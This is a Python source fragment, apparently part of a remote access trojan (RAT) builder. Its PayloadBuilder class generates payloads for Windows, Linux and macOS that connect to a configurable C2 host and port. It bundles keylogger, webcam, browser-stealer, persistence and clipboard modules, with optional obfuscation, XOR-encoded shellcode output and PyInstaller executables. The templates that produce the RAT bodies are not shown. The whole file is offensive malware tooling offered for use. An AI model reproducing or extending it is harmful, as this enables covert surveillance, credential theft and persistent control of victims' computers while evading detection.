class PayloadBuilder:
    """Build standalone RAT payloads."""

    def __init__(self):
        self.built_dir = os.path.join(BASE_DIR, "payloads", "built")
        os.makedirs(self.built_dir, exist_ok=True)

    def build(self, platform, output, c2_host, c2_port,
              modules, evasion, icon=None, onefile=True,
              format="executable", obfuscate=False):
        """Build a RAT payload."""
        print(f"[*] Building {platform} RAT → {output}")
        print(f"    C2: {c2_host}:{c2_port}")
        print(f"    Modules: {', '.join(modules)}")
        print(f"    Evasion: {', '.join(evasion) if evasion else 'none'}")
        print(f"    Format: {format}")

        if modules == ["all"]:
            if platform == "windows":
                modules = ["command_exec", "file_ops", "sysinfo", "process_enum",
                          "persistence", "screen_capture", "keylogger", "webcam",
                          "clipboard", "registry_editor", "browser_stealer",
                          "wifi_profiles"]
            else:
                modules = ["command_exec", "file_ops", "sysinfo", "process_enum",
                          "persistence", "screen_capture", "keylogger",
                          "clipboard", "wifi_profiles"]

        # Generate the RAT source
        rat_source = self._generate_rat_source(
            platform, c2_host, c2_port, modules, evasion
        )

        if obfuscate:
            print("[*] Obfuscating...")
            try:
                from evasion.obfuscator import obfuscate as obf
                rat_source = obf(rat_source)
                print("[+] Obfuscated")
            except Exception as e:
                print(f"[!] Obfuscation failed: {e}")

        # Write the Python source
        src_path = os.path.join(self.built_dir, output + ".py")
        with open(src_path, "w", encoding="utf-8") as f:
            f.write(rat_source)
        print(f"[+] Python source: {src_path} ({len(rat_source)} bytes)")

        if format == "python":
            return src_path

        if format == "shellcode":
            # XOR-encode the source as "shellcode" (simplified)
            key = 0x5A
            data = rat_source.encode()
            sc = bytes(b ^ key for b in data)
            sc_path = os.path.join(self.built_dir, output + ".bin")
            with open(sc_path, "wb") as f:
                f.write(sc)
            print(f"[+] Shellcode: {sc_path} ({len(sc)} bytes)")
            return sc_path

        # Build executable with PyInstaller
        if onefile:
            self._build_pyinstaller(src_path, output, platform, icon)

        return src_path

    def _generate_rat_source(self, platform, c2_host, c2_port, modules, evasion):
        """Generate a standalone RAT Python source file."""
        config = {
            "c2_host": c2_host,
            "c2_port": c2_port,
            "modules": modules,
            "evasion": evasion,
            "platform": platform,
        }
        config_json = json.dumps(config, indent=2)

        if platform == "windows":
            return self._windows_template(config_json, modules, evasion)
        elif platform == "linux":
            return self._linux_template(config_json, modules, evasion)
        elif platform == "macos":
            return self._macos_template(config_json, modules, evasion)

